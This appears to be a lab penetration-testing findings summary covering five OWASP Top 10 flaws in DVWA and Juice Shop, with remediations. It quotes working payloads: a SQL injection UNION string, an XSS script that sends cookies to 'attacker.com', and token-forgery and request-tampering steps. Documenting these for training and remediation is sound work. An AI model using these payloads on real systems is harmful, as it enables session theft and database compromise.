# KAVACH — Workstream B
## Web Application Penetration Testing Findings
### OWASP Top 10 (2021) — Summary Table

Five vulnerabilities spanning OWASP Top 10 (2021) categories were identified, exploited, and remediated across DVWA and OWASP Juice Shop.

| Finding ID | Vulnerability Name | OWASP Category | Target App | Severity | Remediation |
|:---:|:---|:---|:---:|:---:|:---|
| **F-01** | Broken Access Control (Forged Review) | [A01:2021 — Broken Access Control](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A01%20Broken%20Access%20Control/A-01_Broken_Access_Control.md) | Juice Shop | 🟠 High | Server-side Session Check |
| **F-02** | Cryptographic Failures (XOR + AES-ECB) | [A02:2021 — Cryptographic Failures](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A02%20Cryptographic%20Failures/) | DVWA | 🟠 High | AES-GCM + Secrets Vault |
| **F-03** | Injection (SQLi + XSS) | [A03:2021 — Injection](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A03%20Injection/1.SQL%20Injection/1.SQL%20Injection.md) | DVWA | 🔴 Critical | PDO / htmlspecialchars |
| **F-04** | Insecure Design (BasketId Manipulation) | [A04:2021 — Insecure Design](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A04%20Insecure%20Design/1.A04%20Insecure%20Design%20Findings.md) | Juice Shop | 🟡 Medium | Server-side Basket Derivation |
| **F-05** | Auth Failures (Weak Credentials) | [A07:2021 — Identification & Auth Failures](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A07%20Identification%20and%20Authentication%20Failures/1.A07%20Identification%20and%20Authentication%20Failures%20Findings.md) | Juice Shop | 🟠 High | Rate Limiting + Strong Password Policy |

---

## 3. Detailed Vulnerability Summaries

### F-01: Broken Access Control (Forged Review)

- **Payload:** Intercept `PUT /rest/products/{id}/reviews` in Burp Suite → change `"author"` field to victim's email (e.g., `uvogin@juice-sh.op`)
- **Impact:** Post product reviews impersonating any user, manipulate public reputation, and forge user-generated content without authentication.
- **Remediation:** Removed trust from client-supplied `author` field; server now derives the review author directly from the authenticated JWT session token.

---

### F-02: Cryptographic Failures (XOR + AES-ECB)

- **Payload (Low):** Decode Base64+XOR ciphertext using hardcoded key `wachtwoord` → recover plaintext password `Olifant`. **Payload (Medium):** Decrypt AES-128-ECB session token using hardcoded key `ik ben een aardb` → modify JSON (`level: user` → `level: admin`, update expiry) → re-encrypt and submit forged token.
- **Impact:** Full plaintext password recovery and session token forgery leading to administrative account takeover.
- **Remediation:** Replace custom XOR/ECB schemes with AES-256-GCM; store keys in a secrets vault (not hardcoded); use one-way bcrypt/Argon2 hashing for passwords; implement server-side session management.

---

### F-03: Injection (SQLi + Reflected XSS)

- **SQLi Payload:** `1' UNION SELECT user, password FROM users --`
- **XSS Payload:** `<script>fetch('http://attacker.com/log?c='+document.cookie)</script>`
- **Impact (SQLi):** Dump full database contents exposing administrative usernames and password hashes. **Impact (XSS):** Hijack authenticated user sessions and steal cookies.
- **Remediation (SQLi):** Replaced string concatenation with PDO prepared statements and bound variables. **Remediation (XSS):** Wrapped all output display variables in `htmlspecialchars()` to sanitize HTML rendering.

---

### F-04: Insecure Design (BasketId Manipulation)

- **Payload:** Intercept `POST /api/BasketItems/` → change `BasketId` in JSON body from attacker's basket ID to victim's basket ID (e.g., `"BasketId": "6"`).
- **Impact:** Arbitrarily add, modify, or delete items in any other user's shopping basket leading to griefing, unauthorized purchases, and reputational damage.
- **Remediation:** Redesigned API to derive `BasketId` from the authenticated user's server-side session (`req.user.basketId`) — client-supplied `BasketId` is now ignored entirely.

---

### F-05: Auth Failures (Weak Credentials)

- **Payload:** Credential guessing against `/rest/user/login` using weak default credentials (`admin@admin.com` / `admin@1`) with no rate-limiting in place.
- **Impact:** Full administrative account takeover — attacker receives valid JWT token granting complete system access, enabling data breach and application-wide compromise.
- **Remediation:** Implemented Express `express-rate-limit` middleware (max 5 login attempts per 15 minutes per IP) and enforced strong password complexity requirements on account creation.
